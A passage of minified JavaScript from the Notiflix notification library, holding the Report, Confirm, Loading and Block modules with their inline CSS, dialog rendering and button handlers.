option.',D="Okay")),N.length>s.titleMaxLength&&(N=N.substring(0,s.titleMaxLength)+"..."),P.length>s.messageMaxLength&&(P=P.substring(0,s.messageMaxLength)+"..."),D.length>s.buttonMaxLength&&(D=D.substring(0,s.buttonMaxLength)+"..."),s.cssAnimation||(s.cssAnimationDuration=0);var B=t.document.createElement("div");B.id=y.ID,B.className=s.className,B.style.zIndex=s.zindex,B.style.borderRadius=s.borderRadius,B.style.fontFamily='"'+s.fontFamily+'", '+u,s.rtl&&(B.setAttribute("dir","rtl"),B.classList.add("nx-rtl-on")),B.style.display="flex",B.style.flexWrap="wrap",B.style.flexDirection="column",B.style.alignItems="center",B.style.justifyContent="center";var F="",ee=s.backOverlayClickToClose===!0;s.backOverlay&&(F='<div class="'+s.className+"-overlay"+(s.cssAnimation?" nx-with-animation":"")+(ee?" nx-report-click-to-close":"")+'" style="background:'+(Y.backOverlayColor||s.backOverlayColor)+";animation-duration:"+s.cssAnimationDuration+'ms;"></div>');var te="";if(_===g.Success?te=j(s.svgSize,Y.svgColor):_===g.Failure?te=G(s.svgSize,Y.svgColor):_===g.Warning?te=X(s.svgSize,Y.svgColor):_===g.Info&&(te=q(s.svgSize,Y.svgColor)),B.innerHTML=F+'<div class="'+s.className+"-content"+(s.cssAnimation?" nx-with-animation ":"")+" nx-"+s.cssAnimationStyle+'" style="width:'+s.width+"; background:"+s.backgroundColor+"; animation-duration:"+s.cssAnimationDuration+'ms;"><div style="width:'+s.svgSize+"; height:"+s.svgSize+';" class="'+s.className+'-icon">'+te+'</div><h5 class="'+s.className+'-title" style="font-weight:500; font-size:'+s.titleFontSize+"; color:"+Y.titleColor+';">'+N+'</h5><p class="'+s.className+'-message" style="font-size:'+s.messageFontSize+"; color:"+Y.messageColor+';">'+P+'</p><a id="NXReportButton" class="'+s.className+'-button" style="font-weight:500; font-size:'+s.buttonFontSize+"; background:"+Y.buttonBackground+"; color:"+Y.buttonColor+';">'+D+"</a></div>",!t.document.getElementById(B.id)){t.document.querySelector("div.main").appendChild(B);var re=function(){var ce=t.document.getElementById(B.id);ce.classList.add("nx-remove");var ve=setTimeout(function(){ce.parentNode!==null&&ce.parentNode.removeChild(ce),clearTimeout(ve)},s.cssAnimationDuration)},ae=t.document.getElementById("NXReportButton");if(ae.addEventListener("click",function(){typeof V=="function"&&V(),re()}),F&&ee){var ie=t.document.querySelector(".nx-report-click-to-close");ie.addEventListener("click",function(){re()})}}s=I(!0,s,z)},$e=function(){return'[id^=NotiflixConfirmWrap]{position:fixed;z-index:4003;width:100%;height:100%;left:0;top:0;padding:10px;-webkit-box-sizing:border-box;box-sizing:border-box;background:transparent;font-family:"Quicksand",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}[id^=NotiflixConfirmWrap].nx-position-center-top{-webkit-box-pack:start;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}[id^=NotiflixConfirmWrap].nx-position-center-bottom{-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end}[id^=NotiflixConfirmWrap].nx-position-left-top{-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;-webkit-box-pack:start;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}[id^=NotiflixConfirmWrap].nx-position-left-center{-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start}[id^=NotiflixConfirmWrap].nx-position-left-bottom{-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end}[id^=NotiflixConfirmWrap].nx-position-right-top{-webkit-box-align:end;-webkit-align-items:flex-end;-ms-flex-align:end;align-items:flex-end;-webkit-box-pack:start;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}[id^=NotiflixConfirmWrap].nx-position-right-center{-webkit-box-align:end;-webkit-align-items:flex-end;-ms-flex-align:end;align-items:flex-end}[id^=NotiflixConfirmWrap].nx-position-right-bottom{-webkit-box-align:end;-webkit-align-items:flex-end;-ms-flex-align:end;align-items:flex-end;-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end}[id^=NotiflixConfirmWrap] *{-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixConfirmWrap]>div[class*="-overlay"]{width:100%;height:100%;left:0;top:0;background:rgba(255,255,255,.5);position:fixed;z-index:0}[id^=NotiflixConfirmWrap]>div[class*="-overlay"].nx-with-animation{-webkit-animation:confirm-overlay-animation .3s ease-in-out 0s normal;animation:confirm-overlay-animation .3s ease-in-out 0s normal}@-webkit-keyframes confirm-overlay-animation{0%{opacity:0}100%{opacity:1}}@keyframes confirm-overlay-animation{0%{opacity:0}100%{opacity:1}}[id^=NotiflixConfirmWrap].nx-remove>div[class*="-overlay"].nx-with-animation{opacity:0;-webkit-animation:confirm-overlay-animation-remove .3s ease-in-out 0s normal;animation:confirm-overlay-animation-remove .3s ease-in-out 0s normal}@-webkit-keyframes confirm-overlay-animation-remove{0%{opacity:1}100%{opacity:0}}@keyframes confirm-overlay-animation-remove{0%{opacity:1}100%{opacity:0}}[id^=NotiflixConfirmWrap]>div[class*="-content"]{width:300px;max-width:100%;max-height:96vh;overflow-x:hidden;overflow-y:auto;border-radius:25px;padding:10px;margin:0;-webkit-filter:drop-shadow(0 0 5px rgba(0,0,0,0.05));filter:drop-shadow(0 0 5px rgba(0, 0, 0, .05));background:#f8f8f8;color:#1e1e1e;position:relative;z-index:1;text-align:center}[id^=NotiflixConfirmWrap]>div[class*="-content"]::-webkit-scrollbar{width:0;height:0}[id^=NotiflixConfirmWrap]>div[class*="-content"]::-webkit-scrollbar-thumb{background:transparent}[id^=NotiflixConfirmWrap]>div[class*="-content"]::-webkit-scrollbar-track{background:transparent}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]{float:left;width:100%;text-align:inherit}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>h5{float:left;width:100%;margin:0;padding:0 0 10px;border-bottom:1px solid rgba(0,0,0,.1);color:#32c682;font-family:inherit!important;font-size:16px;line-height:1.4;font-weight:500;text-align:inherit}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div{font-family:inherit!important;margin:15px 0 20px;padding:0 10px;float:left;width:100%;font-size:14px;line-height:1.4;font-weight:normal;color:inherit;text-align:inherit}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div{font-family:inherit!important;float:left;width:100%;margin:15px 0 0;padding:0}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div>input{font-family:inherit!important;float:left;width:100%;height:40px;margin:0;padding:0 15px;border:1px solid rgba(0,0,0,.1);border-radius:25px;font-size:14px;font-weight:normal;line-height:1;-webkit-transition:all .25s ease-in-out;-o-transition:all .25s ease-in-out;transition:all .25s ease-in-out;text-align:left}[id^=NotiflixConfirmWrap].nx-rtl-on>div[class*="-content"]>div[class*="-head"]>div>div>input{text-align:right}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div>input:hover{border-color:rgba(0,0,0,.1)}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div>input:focus{border-color:rgba(0,0,0,.3)}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div>input.nx-validation-failure{border-color:#ff5549}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-head"]>div>div>input.nx-validation-success{border-color:#32c682}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border-radius:inherit;float:left;width:100%;text-align:inherit}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]>a{cursor:pointer;font-family:inherit!important;-webkit-transition:all .25s ease-in-out;-o-transition:all .25s ease-in-out;transition:all .25s ease-in-out;float:left;width:48%;padding:9px 5px;border-radius:inherit!important;font-weight:500;font-size:15px;line-height:1.4;color:#f8f8f8;text-align:inherit}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]>a.nx-confirm-button-ok{margin:0 2% 0 0;background:#32c682}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]>a.nx-confirm-button-cancel{margin:0 0 0 2%;background:#a9a9a9}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]>a.nx-full{margin:0;width:100%}[id^=NotiflixConfirmWrap]>div[class*="-content"]>div[class*="-buttons"]>a:hover{-webkit-box-shadow:inset 0 -60px 5px -5px rgba(0,0,0,.25);box-shadow:inset 0 -60px 5px -5px rgba(0,0,0,.25)}[id^=NotiflixConfirmWrap].nx-rtl-on>div[class*="-content"]>div[class*="-buttons"],[id^=NotiflixConfirmWrap].nx-rtl-on>div[class*="-content"]>div[class*="-buttons"]>a{-webkit-transform:rotateY(180deg);transform:rotateY(180deg)}[id^=NotiflixConfirmWrap].nx-with-animation.nx-fade>div[class*="-content"]{-webkit-animation:confirm-animation-fade .3s ease-in-out 0s normal;animation:confirm-animation-fade .3s ease-in-out 0s normal}@-webkit-keyframes confirm-animation-fade{0%{opacity:0}100%{opacity:1}}@keyframes confirm-animation-fade{0%{opacity:0}100%{opacity:1}}[id^=NotiflixConfirmWrap].nx-with-animation.nx-zoom>div[class*="-content"]{-webkit-animation:confirm-animation-zoom .3s ease-in-out 0s normal;animation:confirm-animation-zoom .3s ease-in-out 0s normal}@-webkit-keyframes confirm-animation-zoom{0%{opacity:0;-webkit-transform:scale(.5);transform:scale(.5)}50%{opacity:1;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}@keyframes confirm-animation-zoom{0%{opacity:0;-webkit-transform:scale(.5);transform:scale(.5)}50%{opacity:1;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}[id^=NotiflixConfirmWrap].nx-with-animation.nx-fade.nx-remove>div[class*="-content"]{opacity:0;-webkit-animation:confirm-animation-fade-remove .3s ease-in-out 0s normal;animation:confirm-animation-fade-remove .3s ease-in-out 0s normal}@-webkit-keyframes confirm-animation-fade-remove{0%{opacity:1}100%{opacity:0}}@keyframes confirm-animation-fade-remove{0%{opacity:1}100%{opacity:0}}[id^=NotiflixConfirmWrap].nx-with-animation.nx-zoom.nx-remove>div[class*="-content"]{opacity:0;-webkit-animation:confirm-animation-zoom-remove .3s ease-in-out 0s normal;animation:confirm-animation-zoom-remove .3s ease-in-out 0s normal}@-webkit-keyframes confirm-animation-zoom-remove{0%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}50%{opacity:.5;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:0;-webkit-transform:scale(0);transform:scale(0)}}@keyframes confirm-animation-zoom-remove{0%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}50%{opacity:.5;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:0;-webkit-transform:scale(0);transform:scale(0)}}'},me=function(_,N,P,D,V,U,z,H,Y){if(!L("body"))return!1;r||T.Confirm.init({});var B=I(!0,r,{});typeof Y!="object"||Array.isArray(Y)||(r=I(!0,r,Y)),typeof N!="string"&&(N="Notiflix Confirm"),typeof P!="string"&&(P="Do you agree with me?"),typeof V!="string"&&(V="Yes"),typeof U!="string"&&(U="No"),typeof z!="function"&&(z=void 0),typeof H!="function"&&(H=void 0),r.plainText&&(N=A(N),P=A(P),V=A(V),U=A(U)),r.plainText||(N.length>r.titleMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the title content length is more than "titleMaxLength" option.',V="Okay",U="..."),P.length>r.messageMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the message content length is more than "messageMaxLength" option.',V="Okay",U="..."),(V.length||U.length)>r.buttonsMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the buttons content length is more than "buttonsMaxLength" option.',V="Okay",U="...")),N.length>r.titleMaxLength&&(N=N.substring(0,r.titleMaxLength)+"..."),P.length>r.messageMaxLength&&(P=P.substring(0,r.messageMaxLength)+"..."),V.length>r.buttonsMaxLength&&(V=V.substring(0,r.buttonsMaxLength)+"..."),U.length>r.buttonsMaxLength&&(U=U.substring(0,r.buttonsMaxLength)+"..."),r.cssAnimation||(r.cssAnimationDuration=0);var F=t.document.createElement("div");F.id=x.ID,F.className=r.className+(r.cssAnimation?" nx-with-animation nx-"+r.cssAnimationStyle:""),F.style.zIndex=r.zindex,F.style.padding=r.distance,r.rtl&&(F.setAttribute("dir","rtl"),F.classList.add("nx-rtl-on"));var ee=typeof r.position=="string"?r.position.trim():"center";F.classList.add("nx-position-"+ee),F.style.fontFamily='"'+r.fontFamily+'", '+u;var te="";r.backOverlay&&(te='<div class="'+r.className+"-overlay"+(r.cssAnimation?" nx-with-animation":"")+'" style="background:'+r.backOverlayColor+";animation-duration:"+r.cssAnimationDuration+'ms;"></div>');var re="";typeof z=="function"&&(re='<a id="NXConfirmButtonCancel" class="nx-confirm-button-cancel" style="color:'+r.cancelButtonColor+";background:"+r.cancelButtonBackground+";font-size:"+r.buttonsFontSize+';">'+U+"</a>");var ae="",ie=null,ce=void 0;if(_===v.Ask||_===v.Prompt){ie=D||"";var ve=_===v.Ask||200<ie.length?Math.ceil(1.5*ie.length):250,Ee=_===v.Prompt?'value="'+ie+'"':"";ae='<div><input id="NXConfirmValidationInput" type="text" '+Ee+' maxlength="'+ve+'" style="font-size:'+r.messageFontSize+";border-radius: "+r.borderRadius+';" autocomplete="off" spellcheck="false" autocapitalize="none" /></div>'}if(F.innerHTML=te+'<div class="'+r.className+'-content" style="width:'+r.width+"; background:"+r.backgroundColor+"; animation-duration:"+r.cssAnimationDuration+"ms; border-radius: "+r.borderRadius+';"><div class="'+r.className+'-head"><h5 style="color:'+r.titleColor+";font-size:"+r.titleFontSize+';">'+N+'</h5><div style="color:'+r.messageColor+";font-size:"+r.messageFontSize+';">'+P+ae+'</div></div><div class="'+r.className+'-buttons"><a id="NXConfirmButtonOk" class="nx-confirm-button-ok'+(typeof z=="function"?"":" nx-full")+'" style="color:'+r.okButtonColor+";background:"+r.okButtonBackground+";font-size:"+r.buttonsFontSize+';">'+V+"</a>"+re+"</div></div>",!t.document.getElementById(F.id)){t.document.querySelector("div.main").appendChild(F);var be=t.document.getElementById(F.id),Se=t.document.getElementById("NXConfirmButtonOk"),pe=t.document.getElementById("NXConfirmValidationInput");if(pe&&(pe.focus(),pe.setSelectionRange(0,(pe.value||"").length),pe.addEventListener("keyup",function(ue){var Re=ue.target.value;if(_===v.Ask&&Re!==ie)ue.preventDefault(),pe.classList.add("nx-validation-failure"),pe.classList.remove("nx-validation-success");else{_===v.Ask&&(pe.classList.remove("nx-validation-failure"),pe.classList.add("nx-validation-success"));var Ie=(ue.key||"").toLocaleLowerCase("en")==="enter"||ue.keyCode===13;Ie&&Se.dispatchEvent(new Event("click"))}})),Se.addEventListener("click",function(ue){if(_===v.Ask&&ie&&pe){var Re=(pe.value||"").toString();if(Re!==ie)return pe.focus(),pe.classList.add("nx-validation-failure"),ue.stopPropagation(),ue.preventDefault(),ue.returnValue=!1,ue.cancelBubble=!0,!1;pe.classList.remove("nx-validation-failure")}typeof z=="function"&&(_===v.Prompt&&pe&&(ce=pe.value||""),z(ce)),be.classList.add("nx-remove");var Ie=setTimeout(function(){be.parentNode!==null&&(be.parentNode.removeChild(be),clearTimeout(Ie))},r.cssAnimationDuration)}),typeof z=="function"){var _e=t.document.getElementById("NXConfirmButtonCancel");_e.addEventListener("click",function(){typeof H=="function"&&(_===v.Prompt&&pe&&(ce=pe.value||""),H(ce)),be.classList.add("nx-remove");var ue=setTimeout(function(){be.parentNode!==null&&(be.parentNode.removeChild(be),clearTimeout(ue))},r.cssAnimationDuration)})}}r=I(!0,r,B)},W=function(){return'[id^=NotiflixLoadingWrap]{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:fixed;z-index:4000;width:100%;height:100%;left:0;top:0;right:0;bottom:0;margin:auto;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;text-align:center;-webkit-box-sizing:border-box;box-sizing:border-box;background:rgba(0,0,0,.8);font-family:"Quicksand",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}[id^=NotiflixLoadingWrap] *{-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixLoadingWrap].nx-loading-click-to-close{cursor:pointer}[id^=NotiflixLoadingWrap]>div[class*="-icon"]{width:60px;height:60px;position:relative;-webkit-transition:top .2s ease-in-out;-o-transition:top .2s ease-in-out;transition:top .2s ease-in-out;margin:0 auto}[id^=NotiflixLoadingWrap]>div[class*="-icon"] img,[id^=NotiflixLoadingWrap]>div[class*="-icon"] svg{max-width:unset;max-height:unset;width:100%;height:auto;position:absolute;left:0;top:0}[id^=NotiflixLoadingWrap]>p{position:relative;margin:10px auto 0;font-family:inherit!important;font-weight:normal;font-size:15px;line-height:1.4;padding:0 10px;width:100%;text-align:center}[id^=NotiflixLoadingWrap].nx-with-animation{-webkit-animation:loading-animation-fade .3s ease-in-out 0s normal;animation:loading-animation-fade .3s ease-in-out 0s normal}@-webkit-keyframes loading-animation-fade{0%{opacity:0}100%{opacity:1}}@keyframes loading-animation-fade{0%{opacity:0}100%{opacity:1}}[id^=NotiflixLoadingWrap].nx-with-animation.nx-remove{opacity:0;-webkit-animation:loading-animation-fade-remove .3s ease-in-out 0s normal;animation:loading-animation-fade-remove .3s ease-in-out 0s normal}@-webkit-keyframes loading-animation-fade-remove{0%{opacity:1}100%{opacity:0}}@keyframes loading-animation-fade-remove{0%{opacity:1}100%{opacity:0}}[id^=NotiflixLoadingWrap]>p.nx-loading-message-new{-webkit-animation:loading-new-message-fade .3s ease-in-out 0s normal;animation:loading-new-message-fade .3s ease-in-out 0s normal}@-webkit-keyframes loading-new-message-fade{0%{opacity:0}100%{opacity:1}}@keyframes loading-new-message-fade{0%{opacity:0}100%{opacity:1}}'},Q=function(_,N,P,D,V){if(!L("body"))return!1;o||T.Loading.init({});var U=I(!0,o,{});if(typeof N=="object"&&!Array.isArray(N)||typeof P=="object"&&!Array.isArray(P)){var z={};typeof N=="object"?z=N:typeof P=="object"&&(z=P),o=I(!0,o,z)}var H="";if(typeof N=="string"&&0<N.length&&(H=N),D){H=H.length>o.messageMaxLength?A(H).toString().substring(0,o.messageMaxLength)+"...":A(H).toString();var Y="";0<H.length&&(Y='<p id="'+o.messageID+'" class="nx-loading-message" style="color:'+o.messageColor+";font-size:"+o.messageFontSize+';">'+H+"</p>"),o.cssAnimation||(o.cssAnimationDuration=0);var B="";if(_===E.Standard)B=J(o.svgSize,o.svgColor);else if(_===E.Hourglass)B=K(o.svgSize,o.svgColor);else if(_===E.Circle)B=le(o.svgSize,o.svgColor);else if(_===E.Arrows)B=se(o.svgSize,o.svgColor);else if(_===E.Dots)B=de(o.svgSize,o.svgColor);else if(_===E.Pulse)B=oe(o.svgSize,o.svgColor);else if(_===E.Custom&&o.customSvgCode!==null&&o.customSvgUrl===null)B=o.customSvgCode||"";else if(_===E.Custom&&o.customSvgUrl!==null&&o.customSvgCode===null)B='<img class="nx-custom-loading-icon" width="'+o.svgSize+'" height="'+o.svgSize+'" src="'+o.customSvgUrl+'" alt="Notiflix">';else{if(_===E.Custom&&(o.customSvgUrl===null||o.customSvgCode===null))return C('You have to set a static SVG url to "customSvgUrl" option to use Loading Custom.'),!1;B=ge(o.svgSize,"#f8f8f8","#32c682")}var F=parseInt((o.svgSize||"").replace(/[^0-9]/g,"")),ee=t.innerWidth,te=F>=ee?ee-40+"px":F+"px",re='<div style="width:'+te+"; height:"+te+';" class="'+o.className+"-icon"+(0<H.length?" nx-with-message":"")+'">'+B+"</div>",ae=t.document.createElement("div");if(ae.id=S.ID,ae.className=o.className+(o.cssAnimation?" nx-with-animation":"")+(o.clickToClose?" nx-loading-click-to-close":""),ae.style.zIndex=o.zindex,ae.style.background=o.backgroundColor,ae.style.animationDuration=o.cssAnimationDuration+"ms",ae.style.fontFamily='"'+o.fontFamily+'", '+u,ae.style.display="flex",ae.style.flexWrap="wrap",ae.style.flexDirection="column",ae.style.alignItems="center",ae.style.justifyContent="center",o.rtl&&(ae.setAttribute("dir","rtl"),ae.classList.add("nx-rtl-on")),ae.innerHTML=re+Y,!t.document.getElementById(ae.id)&&(t.document.querySelector("div.main").appendChild(ae),o.clickToClose)){var ie=t.document.getElementById(ae.id);ie.addEventListener("click",function(){ae.classList.add("nx-remove");var Ee=setTimeout(function(){ae.parentNode!==null&&(ae.parentNode.removeChild(ae),clearTimeout(Ee))},o.cssAnimationDuration)})}}else if(t.document.getElementById(S.ID))var ce=t.document.getElementById(S.ID),ve=setTimeout(function(){ce.classList.add("nx-remove");var Ee=setTimeout(function(){ce.parentNode!==null&&(ce.parentNode.removeChild(ce),clearTimeout(Ee))},o.cssAnimationDuration);clearTimeout(ve)},V);o=I(!0,o,U)},Z=function(_){typeof _!="string"&&(_="");var N=t.document.getElementById(S.ID);if(N)if(0<_.length){_=_.length>o.messageMaxLength?A(_).substring(0,o.messageMaxLength)+"...":A(_);var P=N.getElementsByTagName("p")[0];if(P)P.innerHTML=_;else{var D=t.document.createElement("p");D.id=o.messageID,D.className="nx-loading-message nx-loading-message-new",D.style.color=o.messageColor,D.style.fontSize=o.messageFontSize,D.innerHTML=_,N.appendChild(D)}}else C("Where is the new message?")},ne=function(){return'[id^=NotiflixBlockWrap]{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-box-sizing:border-box;box-sizing:border-box;position:absolute;z-index:1000;font-family:"Quicksand",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:rgba(255,255,255,.9);text-align:center;animation-duration:.4s;width:100%;height:100%;left:0;top:0;border-radius:inherit;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}[id^=NotiflixBlockWrap] *{-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixBlockWrap]>span[class*="-icon"]{display:block;width:45px;height:45px;position:relative;margin:0 auto}[id^=NotiflixBlockWrap]>span[class*="-icon"] svg{width:inherit;height:inherit}[id^=NotiflixBlockWrap]>span[class*="-message"]{position:relative;display:block;width:100%;margin:10px auto 0;padding:0 10px;font-family:inherit!important;font-weight:normal;font-size:14px;line-height:1.4}[id^=NotiflixBlockWrap].nx-with-animation{-webkit-animation:block-animation-fade .3s ease-in-out 0s normal;animation:block-animation-fade .3s ease-in-out 0s normal}@-webkit-keyframes block-animation-fade{0%{opacity:0}100%{opacity:1}}@keyframes block-animation-fade{0%{opacity:0}100%{opacity:1}}[id^=NotiflixBlockWrap].nx-with-animation.nx-remove{opacity:0;-webkit-animation:block-animation-fade-remove .3s ease-in-out 0s normal;animation:block-animation-fade-remove .3s ease-in-out 0s normal}@-webkit-keyframes block-animation-fade-remove{0%{opacity:1}100%{opacity:0}}@keyframes block-animation-fade-remove{0%{opacity:1}100%{opacity:0}}'},fe=0,M=function(_,N,P,D,V,U){var z;if(Array.isArray(P)){if(1>P.length)return C("Array of HTMLElements should contains at least one HTMLElement."),!1;z=P}else if(Object.prototype.isPrototypeOf.call(NodeList.prototype,P)){if(1>P.length)return C("NodeListOf<HTMLElement> should contains at least one HTMLElement."),!1;z=Array.prototype.slice.call(P)}else{var H=typeof P!="string"||1>(P||"").length||(P||"").length===1&&((P||"")[0]==="#"||(P||"")[0]===".");if(H)return C("The selector parameter must be a string and matches a specified CSS selector(s)."),!1;var Y=t.document.querySelectorAll(P);if(1>Y.length)return C('You called the "Notiflix.Block..." function with "'+P+'" selector, but there is no such element(s) in the document.'),!1;z=Y}l||T.Block.init({});var B=I(!0,l,{});if(typeof D=="object"&&!Array.isArray(D)||typeof V=="object"&&!Array.isArray(V)){var F={};typeof D=="object"?F=D:typeof V=="object"&&(F=V),l=I(!0,l,F)}var ee="";typeof D=="string"&&0<D.length&&(ee=D),l.cssAnimation||(l.cssAnimationDuration=0);var te=k.className;typeof l.className=="string"&&(te=l.className.trim());var re=typeof l.querySelectorLimit=="number"?l.querySelectorLimit:200,ae=(z||[]).length>=re?re:z.length,ie="nx-block-temporary-position";if(_){for(var ce,ve=["area","base","br","col","command","embed","hr","img","input","keygen","link","meta","param","source","track","wbr","html","head","title","script","style","iframe"],Ee=0;Ee<ae;Ee++)if(ce=z[Ee],ce){if(-1<ve.indexOf(ce.tagName.toLocaleLowerCase("en")))break;var be=ce.querySelectorAll("[id^="+k.ID+"]");if(1>be.length){var Se="";N&&(N===w.Hourglass?Se=K(l.svgSize,l.svgColor):N===w.Circle?Se=le(l.svgSize,l.svgColor):N===w.Arrows?Se=se(l.svgSize,l.svgColor):N===w.Dots?Se=de(l.svgSize,l.svgColor):N===w.Pulse?Se=oe(l.svgSize,l.svgColor):Se=J(l.svgSize,l.svgColor));var pe='<span class="'+te+'-icon" style="width:'+l.svgSize+";height:"+l.svgSize+';">'+Se+"</span>",_e="";0<ee.length&&(ee=ee.length>l.messageMaxLength?A(ee).substring(0,l.messageMaxLength)+"...":A(ee),_e='<span style="font-size:'+l.messageFontSize+";color:"+l.messageColor+';" class="'+te+'-message">'+ee+"</span>"),fe++;var ue=t.document.createElement("div");ue.id=k.ID+"-"+fe,ue.className=te+(l.cssAnimation?" nx-with-animation":""),ue.style.position=l.position,ue.style.zIndex=l.zindex,ue.style.background=l.backgroundColor,ue.style.animationDuration=l.cssAnimationDuration+"ms",ue.style.fontFamily='"'+l.fontFamily+'", '+u,ue.style.display="flex",ue.style.flexWrap="wrap",ue.style.flexDirection="column",ue.style.alignItems="center",ue.style.justifyContent="center",l.rtl&&(ue.setAttribute("dir","rtl"),ue.classList.add("nx-rtl-on")),ue.innerHTML=pe+_e;var Re=t.getComputedStyle(ce).getPropertyValue("position"),Ie=typeof Re=="string"?Re.toLocaleLowerCase("en"):"relative",Pe=Math.round(1.25*parseInt(l.svgSize))+40,Le=ce.offsetHeight||0,xe="";Pe>Le&&(xe="min-height:"+Pe+"px;");var Me="";Me=ce.getAttribute("id")?"#"+ce.getAttribute("id"):ce.classList[0]?"."+ce.classList[0]:(ce.tagName||"").toLocaleLowerCase("en");var Be="",De=-1>=["absolute","relative","fixed","sticky"].indexOf(Ie);if(De||0<xe.length){if(!L("head"))return!1;De&&(Be="position:relative!important;");var Ve='<style id="Style-'+k.ID+"-"+fe+'">'+Me+"."+ie+"{"+Be+xe+"}</style>",Fe=t.document.createRange();Fe.selectNode(t.document.head);var je=Fe.createContextualFragment(Ve);t.document.head.appendChild(je),ce.classList.add(ie)}ce.appendChild(ue)}}}else var Ue=function(Te){var Ne=setTimeout(function(){Te.parentNode!==null&&Te.parentNode.removeChild(Te);var Ae=Te.getAttribute("id"),Oe=t.document.getElementById("Style-"+Ae);Oe&&Oe.parentNode!==null&&Oe.parentNode.removeChild(Oe),clearTimeout(Ne)},l.cssAnimationDuration)},ze=function(Te){if(Te&&0<Te.length)for(var Ne,Ae=0;Ae<Te.length;Ae++)Ne=Te[Ae],Ne&&(Ne.classList.add("nx-remove"),Ue(Ne));else R(typeof P=="string"?'"Notiflix.Block.remove();" function called with "'+P+'" selector, but this selector does not have a "Block" element to remove.':'"Notiflix.Block.remove();" function called with "'+P+'", but this "Array<HTMLElement>" or "NodeListOf<HTMLElement>" does not have a "Block" element to remove.')},qe=function(Te){var Ne=setTimeout(function(){Te.classList.remove(ie),clearTimeout(Ne)},l.cssAnimationDuration+300)},We=setTimeout(function(){for(var Te,Ne=0;Ne<ae;Ne++)Te=z[Ne],Te&&(qe(Te),be=Te.querySelectorAll("[id^="+k.ID+"]"),ze(be));clearTimeout(We)},U);l=I(!0,l,B)},T={Notify:{init:function(_){n=I(!0,m,_),O(ke,"NotiflixNotifyInternalCSS")},merge:function(_){return n?void(n=I(!0,n,_)):(C("You have to initialize the Notify module before call Merge function."),!1)},success:function(_,N,P){he(f.Success,_,N,P)},failure:function(_,N,P){he(f.Failure,_,N,P)},warning:function(_,N,P){he(f.Warning,_,N,P)},info:function(_,N,P){he(f.Info,_,N,P)}},Report:{init:function(_){s=I(!0,y,_),O(Ce,"NotiflixReportInternalCSS")},merge:function(_){return 